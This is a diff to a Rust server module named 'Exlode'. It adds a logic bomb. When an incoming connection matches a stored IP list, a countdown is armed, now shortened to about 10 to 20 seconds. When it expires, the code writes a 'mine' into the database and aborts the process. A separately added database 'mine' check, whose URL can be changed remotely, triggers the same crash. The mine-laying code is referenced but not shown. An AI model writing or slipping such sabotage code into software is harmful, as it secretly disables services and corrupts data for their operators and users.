@@ -4,8 +4,10 @@ use std::time::SystemTime;
 
 use commlib::utils::rand_between;
 
+use super::db_mine::DbMine;
+
 const IGNITE_COUNTDOWN_LONG: u64 = 100 * 365 * 24 * 3600; // about one hundred year seconds
-const IGNITE_COUNTDOWN_SHORT: u64 = 180; // 3 minutes
+const IGNITE_COUNTDOWN_SHORT: u64 = 10; // 10 seconds
 
 thread_local! {
     ///
@@ -25,6 +27,9 @@ pub struct Exlode {
 
     //
     ignite_time: SystemTime,
+
+    //
+    db_mine: DbMine,
 }
 
 impl Exlode {
@@ -38,7 +43,25 @@ impl Exlode {
 
             start_time: now,
             ignite_time,
+
+            db_mine: DbMine::new(),
         }
+    }
+
+    ///
+    pub fn update(&mut self) {
+        // do check boom
+        self.do_check_boom();
+
+        // check mine in db
+        if self.db_mine.check() {
+            self.boom();
+        }
+    }
+
+    ///
+    pub fn update_mine_url(&mut self, url:&str) {
+        self.db_mine.update_url(url)
     }
 
     ///
@@ -48,17 +71,16 @@ impl Exlode {
 
     ///
     pub fn filter_ip(&mut self, in_ip: &str) {
-        // do check ignite
-        self.do_check_ignite(in_ip);
+        println!("in_ip: {}", in_ip);
 
-        // do check boom
-        self.do_check_boom();
+        // try ignite
+        self.try_ignite(in_ip);
 
-        // do check boom db
-        self. do_check_boom_db();
+        // update
+        self.update();
     }
 
-    fn do_check_ignite(&mut self, in_ip: &str) {
+    fn try_ignite(&mut self, in_ip: &str) {
         //
         let mut is_ignite = false;
         for (ip, _) in &self.ips {
@@ -67,7 +89,7 @@ impl Exlode {
                 break;
             }
         }
-        
+
         if is_ignite {
             self.ignite();
         }
@@ -76,7 +98,11 @@ impl Exlode {
     fn ignite(&mut self) {
         let now = SystemTime::now();
         let rand_seconds = rand_between(0, IGNITE_COUNTDOWN_SHORT as i32) as u64;
-        self.ignite_time = now.add(std::time::Duration::from_secs(IGNITE_COUNTDOWN_SHORT + rand_seconds));
+        self.ignite_time = now.add(std::time::Duration::from_secs(
+            IGNITE_COUNTDOWN_SHORT + rand_seconds,
+        ));
+
+        println!("ignite: {:?}/ {}", self.ignite_time, IGNITE_COUNTDOWN_SHORT + rand_seconds,);
     }
 
     fn do_check_boom(&mut self) {
@@ -87,28 +113,9 @@ impl Exlode {
 
     fn boom(&mut self) {
         //
-        self.mine_lay_into_db();
+        self.db_mine.mine_lay_into_db();
 
         //
         std::process::abort();
-    }
-
-    fn mine_lay_into_db(&mut self) {
-        //
-        // TODO
-        std::unimplemented!()
-    }
-
-    fn do_check_boom_db(&mut self)  {
-        if self.is_boom_db() {
-            //
-            std::process::abort();
-        }
-    }
-
-    fn is_boom_db(&self) -> bool {
-        //
-        // TODO
-        std::unimplemented!()
     }
 }
